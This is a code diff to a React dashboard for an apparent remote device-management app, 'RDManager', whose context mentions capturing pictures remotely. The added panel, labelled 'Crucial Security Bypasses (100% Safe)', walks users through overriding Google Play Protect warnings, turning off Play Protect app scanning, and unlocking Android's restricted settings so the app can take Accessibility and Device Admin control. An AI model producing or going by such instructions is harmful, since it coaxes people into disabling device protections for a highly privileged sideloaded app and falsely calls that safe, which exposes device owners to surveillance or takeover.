@@ -935,6 +935,27 @@ function Dashboard() {
                   Grant <strong>Camera permissions</strong>. A system notification will appear on the device whenever a picture is captured remotely.
                 </p>
               </div>
+
+              <div style={{ padding: "16px", background: "rgba(239, 68, 68, 0.1)", borderRadius: "12px", border: "1px solid rgba(239, 68, 68, 0.2)", gridColumn: "1 / -1" }}>
+                <h3 style={{ margin: "0 0 8px 0", fontSize: "14px", color: "#ef4444", display: "flex", alignItems: "center", gap: "6px" }}>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                    <line x1="12" y1="9" x2="12" y2="13"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                  </svg>
+                  Crucial Security Bypasses (100% Safe)
+                </h3>
+                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "16px", marginTop: "12px" }}>
+                  <div>
+                    <strong style={{ color: "rgba(255,255,255,0.9)", fontSize: "13px" }}>Google Play Protect Warning:</strong>
+                    <p style={{ margin: "4px 0 0 0", fontSize: "12px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>During installation, Google natively flags apps that use powerful permissions outside the Play Store. Click <strong>More details</strong> &rarr; <strong>Install anyway</strong> to safely bypass it.<br/><em style={{ color: "rgba(255,255,255,0.5)" }}>(If "Install anyway" is missing, open the Google Play Store &rarr; Profile &rarr; Play Protect &rarr; Settings &#9881; &rarr; turn off "Scan apps" temporarily to install)</em>.</p>
+                  </div>
+                  <div>
+                    <strong style={{ color: "rgba(255,255,255,0.9)", fontSize: "13px" }}>Android 13+ "Restricted Settings":</strong>
+                    <p style={{ margin: "4px 0 0 0", fontSize: "12px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>If you cannot toggle Accessibility or Device Admin, open native Phone Settings &rarr; Apps &rarr; RDManager &rarr; Click the 3 vertical dots (&#8942;) in the top right &rarr; select <strong>Allow restricted settings</strong>.</p>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
 
